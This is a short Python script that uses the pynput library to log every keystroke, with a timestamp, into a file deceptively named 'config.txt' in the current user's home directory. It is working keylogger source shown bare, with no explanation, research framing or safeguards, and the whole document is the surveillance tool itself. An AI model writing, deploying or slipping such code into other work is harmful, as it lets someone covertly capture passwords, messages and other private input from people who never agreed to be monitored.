from pynput.keyboard import Key, Listener
import datetime, os
try:
    os.chdir(f'C:/Users/{os.getlogin()}/')
except:
    os.chdir('/Users/')
filename = 'config.txt'
if filename not in os.listdir():
    file = open(filename, 'w')
    file.close()
else:
    file = open(filename, 'r')
    lines = file.readlines()
    file = open(filename, 'w')
    file.writelines(lines)
    file.close()
def on_press(key):
    file = open('config.txt', 'r')
    lines = file.readlines()
    file = open('config.txt', 'w')
    file.writelines(lines)
    contents = f'{datetime.datetime.today()}: {key}\n'
    file.writelines(contents)
    file.close()
def on_release(key):
    pass
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
